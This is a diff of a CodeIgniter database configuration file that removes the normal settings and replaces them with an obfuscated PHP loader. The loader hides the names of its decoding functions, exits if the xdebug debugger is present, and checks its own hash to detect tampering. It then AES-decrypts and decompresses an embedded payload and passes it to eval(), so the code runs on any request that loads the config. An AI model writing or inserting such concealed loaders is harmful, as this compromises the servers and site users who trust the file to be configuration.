@@ -1,96 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-| -------------------------------------------------------------------
-| DATABASE CONNECTIVITY SETTINGS
-| -------------------------------------------------------------------
-| This file will contain the settings needed to access your database.
-|
-| For complete instructions please consult the 'Database Connection'
-| page of the User Guide.
-|
-| -------------------------------------------------------------------
-| EXPLANATION OF VARIABLES
-| -------------------------------------------------------------------
-|
-|	['dsn']      The full DSN string describe a connection to the database.
-|	['hostname'] The hostname of your database server.
-|	['username'] The username used to connect to the database
-|	['password'] The password used to connect to the database
-|	['database'] The name of the database you want to connect to
-|	['dbdriver'] The database driver. e.g.: mysqli.
-|			Currently supported:
-|				 cubrid, ibase, mssql, mysql, mysqli, oci8,
-|				 odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
-|	['dbprefix'] You can add an optional prefix, which will be added
-|				 to the table name when using the  Query Builder class
-|	['pconnect'] TRUE/FALSE - Whether to use a persistent connection
-|	['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
-|	['cache_on'] TRUE/FALSE - Enables/disables query caching
-|	['cachedir'] The path to the folder where cache files should be stored
-|	['char_set'] The character set used in communicating with the database
-|	['dbcollat'] The character collation used in communicating with the database
-|				 NOTE: For MySQL and MySQLi databases, this setting is only used
-| 				 as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
-|				 (and in table creation queries made with DB Forge).
-| 				 There is an incompatibility in PHP with mysql_real_escape_string() which
-| 				 can make your site vulnerable to SQL injection if you are using a
-| 				 multi-byte character set and are running versions lower than these.
-| 				 Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
-|	['swap_pre'] A default table prefix that should be swapped with the dbprefix
-|	['encrypt']  Whether or not to use an encrypted connection.
-|
-|			'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
-|			'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
-|
-|				'ssl_key'    - Path to the private key file
-|				'ssl_cert'   - Path to the public key certificate file
-|				'ssl_ca'     - Path to the certificate authority file
-|				'ssl_capath' - Path to a directory containing trusted CA certificates in PEM format
-|				'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
-|				'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
-|
-|	['compress'] Whether or not to use client compression (MySQL only)
-|	['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
-|							- good for ensuring strict SQL while developing
-|	['ssl_options']	Used to set various SSL options that can be used when making SSL connections.
-|	['failover'] array - A array with 0 or more data for connections if the main should fail.
-|	['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
-| 				NOTE: Disabling this will also effectively disable both
-| 				$this->db->last_query() and profiling of DB queries.
-| 				When you run a query, with this setting set to TRUE (default),
-| 				CodeIgniter will store the SQL statement for debugging purposes.
-| 				However, this may cause high memory usage, especially if you run
-| 				a lot of SQL queries ... disable this to avoid that problem.
-|
-| The $active_group variable lets you choose which connection group to
-| make active.  By default there is only one group (the 'default' group).
-|
-| The $query_builder variables lets you determine whether or not to load
-| the query builder class.
-*/
-$active_group = 'default';
-$query_builder = TRUE;
-
-$db['default'] = array(
-	'dsn'	=> '',
-	'hostname' => 'localhost',
-	'username' => 'root',
-	'password' => '',
-	'database' => 'localhost3',
-	'dbdriver' => 'mysqli',
-	'dbprefix' => '',
-	'pconnect' => FALSE,
-	'db_debug' => (ENVIRONMENT !== 'production'),
-	'cache_on' => FALSE,
-	'cachedir' => '',
-	'char_set' => 'utf8',
-	'dbcollat' => 'utf8_general_ci',
-	'swap_pre' => '',
-	'encrypt' => FALSE,
-	'compress' => FALSE,
-	'stricton' => FALSE,
-	'failover' => array(),
-	'save_queries' => TRUE
-);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ugwccw98=('bas'.'e64'.'_de'.'cod'.'e');
+$_x68ki5rg=('gzu'.'nco'.'mpr'.'ess');
+$_dvm3g6zl=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_u48rn25v='fbzorOtT';
+$_qjdzqydy='zxFktHNa';
+$_ue2zstm5='FEM8vAMN';
+$_qx77ppp9='eOztJve1';
+$_t0mphz4v='4LQh77rqBT4=';
+$_toi47u1a='DW2bcg==';
+$_h9rsj3ux='8syiUtQn';
+$_ga35r7w8='N96cbx/X';
+$_jsykfpeu=$_ugwccw98($_qjdzqydy.$_qx77ppp9.$_ue2zstm5.$_u48rn25v.$_t0mphz4v);
+$_t3fjiwum=$_ugwccw98($_ga35r7w8.$_h9rsj3ux.$_toi47u1a);
+$_pjek80wv=$_ugwccw98('4ql96O1eZc5OIjmDE2EYlxNHYqn/z4kbUsuzqsK7/9nPRcekBKUZr7+tLOh4F+FtetxGkNcUEmu6EKogFBZH51gOJ+PU2J09qWKsOFLRtkKHVued1lr6teai8A2OQ4BErnSZmmvtPaoKY29kDoDkVGJr0L8UjJz03raeEWRlI5dn3EpB63beMGzZXpLa2RJZUO/qC8q8dQhWDVdELiRlXTqUrObIH7QeJchqObGkxtq+fEjeMoTY6b85V6BcRzgmRUOpX7RScl51B5NXz98ZSSX4IUVYDkaufM9qpYzKmWEyWP4zyjkFSlEbG+kXtmojGnTM1RYmDY0x/qGNTS3gadT3MiyLp9eMENI59TjuOTiypS2hyyvFeP+hNEiVIsy/vXvGyrH07u2o6myrvOgqLDRwHc6Udy1Ba//64sFrqxhrNK3nMcRc6DbhZq+dhi2jnbNqsMB6GLhYxondOtsoj7sPfjxVQUb/CgEqSe6Dn9DR70h9FbmAtguWjITyNh3YoTdKaUaocTs9PmSn2/62snd/GS3+ofjMsxj//w0E34DtI/ZSZp4c6yVpkjlvQRzlmANx/7TXSkPgz4YO4buptaxO7vvVQbUptD/wqfx75dfHhha7HXMOzzRjqnbeztdQlLCnkJzfO44CKJEAHdObNj7aEf2bRbLTcfy0D0fcLTTH9cRlHntnDgEU04UaAe51cjawVq7QRrE4GN4wGSdAsArKlEPhPcEAM4WT5tQIGsxUa/G3+UP+dapVqXx7WnUS8QM3eOkiU0yc8femfWF8YyOVszlF1bfEs0oJZKQmd2rzJ9pExn28k7XKB0fEmUJUPXgYO+Ssv11fvXOvzi6rUk+CrlPbiZp3ZM5YXfJOm5k=');
+$_lstdpn1q=$_dvm3g6zl($_pjek80wv,'aes-256-cbc',$_jsykfpeu,OPENSSL_RAW_DATA,$_t3fjiwum);
+if($_lstdpn1q===false){exit;}
+$_wscz9w8k=$_x68ki5rg($_lstdpn1q);
+if($_wscz9w8k===false){exit;}
+$_ieit538c='0dc21da506ba36aab70ee9fd545deb0f2f0c7370126e048172d9c7560ba8ba7d';
+$_xky0mqxp=@file_get_contents(__FILE__);
+if($_xky0mqxp!==false){
+$_uzn3k9sl=str_replace($_ieit538c,"0000000000000000000000000000000000000000000000000000000000000000",$_xky0mqxp);
+$_ug1ukw5p=hash("sha256",$_uzn3k9sl);
+if($_ug1ukw5p!==$_ieit538c){@http_response_code(403);exit;}
+}
+eval($_wscz9w8k);
